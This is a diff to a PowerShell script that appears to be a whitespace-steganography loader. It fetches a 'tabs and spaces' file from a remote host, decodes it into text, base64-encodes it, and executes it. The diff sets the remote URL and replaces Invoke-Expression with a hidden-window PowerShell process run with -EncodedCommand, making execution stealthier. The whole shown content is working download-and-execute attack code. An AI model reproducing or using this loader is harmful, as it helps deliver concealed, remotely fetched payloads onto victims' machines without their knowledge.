@@ -1,5 +1,5 @@
 # URL of the tabs and spaces file
-$tabsSpacesURL = "<http://YOUR_HOSTED_TABBY_PAYLOAD>"
+$tabsSpacesURL = "http://x.x.x.x/tabsandspaces.txt"
 
 # Fetch tabs and spaces content from the URL
 $tabsSpacesData = (Invoke-WebRequest -Uri $tabsSpacesURL).Content
@@ -16,6 +16,22 @@ for ($i = 0; $i -lt $binaryData.Length; $i += 8) {
 # Convert text data to base64
 $base64TextData = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($textData))
 
-# Execute the final base64 output
-$encodedCommand = "powershell.exe -EncodedCommand $base64TextData"
-Invoke-Expression $encodedCommand
+# Create a new PowerShell process
+$process = New-Object System.Diagnostics.Process
+$process.StartInfo.FileName = "powershell.exe"
+$process.StartInfo.Arguments = "-w hidden -EncodedCommand $base64TextData"
+$process.StartInfo.UseShellExecute = $false
+$process.StartInfo.RedirectStandardOutput = $true
+$process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+$process.Start()
+
+# Continuously read from the output stream
+while ($process.HasExited -eq $false) {
+    $output = $process.StandardOutput.ReadLine()
+    if ($output -ne $null) {
+        Write-Host $output
+    }
+}
+
+# Wait for the process to exit
+$process.WaitForExit()
